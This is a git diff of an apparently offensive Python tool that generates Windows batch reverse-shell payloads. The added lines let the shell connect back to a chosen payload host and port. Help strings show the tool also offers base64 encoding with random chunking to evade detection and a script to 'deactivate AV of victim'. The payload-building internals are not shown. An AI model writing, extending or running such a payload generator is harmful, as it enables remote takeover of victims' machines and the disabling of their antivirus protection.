@@ -49,6 +49,9 @@ def arg_init():
     app.add_argument("-s", "--shelloutname", required=False, help = "Reverse Shell.  Value: fileoutputname. Requires: [-lh] [-lp], optional: [-b64] [-ch] [-v]")
     app.add_argument("-avkill", "--antiviruskill", required = False, help = "script to deactivate AV of victim if executed with admin privileges. Optional flag: [-b64] [-ch]")
     app.add_argument("-lh", "--localhost", required=False, help = "host for payload (\"lh\" for automatically assign host to this systems address)")
+    app.add_argument("-ph", "--payloadhost", required=False, help = "host to connect to")
+    app.add_argument("-pp", "--payloadport", required=False, help = "port to to connect to")
+    app.add_argument("-lstp", "--listenport", required=False, help = "port to listen on with netcat")
     app.add_argument("-lp", "--localport", required=False, help = "port for payload (4 digit number recommended)")
     app.add_argument("-b64", action = "store_true", help = "encodes payload to base64")
     app.add_argument("-ch", action = "store_true", required=False, help = "chunks up base64 encoded string (chunking probability in CHUNK_PROBABILITY)")
@@ -116,7 +119,7 @@ def shell_tcp(host, port, encode = False, chunk = False, varencode = False):
         body = chunk_up(string = body)
     return top + body + finish
 
-def get_payload(name: str = "shell.bat", host = this_ip(), port = "4444", encode = False, chunk = False, varencode = False):
+def get_payload(name: str = "shell.bat", host = this_ip(), payloadhost=this_ip(), payloadport="4444", port = "4444", encode = False, chunk = False, varencode = False):
         global chunk_count
         if chunk and not encode: print("[!] chunking only makes sense with encoding to base64 and will be terminated. make sure you set -b64 flag too to do so");chunk = False
         print("Please wait while the shellcode is being created, this may take a few seconds...")
@@ -124,7 +127,7 @@ def get_payload(name: str = "shell.bat", host = this_ip(), port = "4444", encode
         hv = validateip(host)
         if hv: print(hv)
         validateport(port)
-        open((name if name.endswith(".bat") else name + ".bat"), "w").write(shell_tcp(host, port, encode=encode, chunk=chunk, varencode=varencode))
+        open((name if name.endswith(".bat") else name + ".bat"), "w").write(shell_tcp(payloadhost, payloadport, encode=encode, chunk=chunk, varencode=varencode))
         print("\r")
         print(f"[*] Successfully exported payload to \"{name if name.endswith('.bat') else name + '.bat'}\"" + (" with encoding base64" if encode else "") + (" and chunked up " + str(chunk_count) + " times!" if chunk else "!"))
         
@@ -148,7 +151,7 @@ if __name__ == "__main__":
         if platform.system().lower() not in ["windows", "linux"]: raise UnkownHostOS(platform.system())
         args, handle = arg_init()
         if not any(args.values()): handle.print_help()
-        if args["shelloutname"] and args["localhost"] != None and args["localport"] != None: get_payload(name = args["shelloutname"], host = (args["localhost"] if args["localhost"] != "lh" else this_ip()), port = args["localport"], encode = args["b64"], chunk = args["ch"], varencode = args["varencode"])
+        if args["shelloutname"] and args["localhost"] != None and args["localport"] != None: get_payload(name = args["shelloutname"], host = (args["localhost"] if args["localhost"] != "lh" else this_ip()), payloadhost = (args["payloadhost"] if args["payloadhost"] != None else this_ip()), payloadport = (args["payloadport"] if args["payloadport"] != None else "4444"), port = args["localport"], encode = args["b64"], chunk = args["ch"], varencode = args["varencode"])
         elif args["antiviruskill"]: get_avkill(args["antiviruskill"], encode = args["b64"], chunk = args["ch"])
         else: 
             if not len(sys.argv) < 2:print("You've not entered an valid command!")
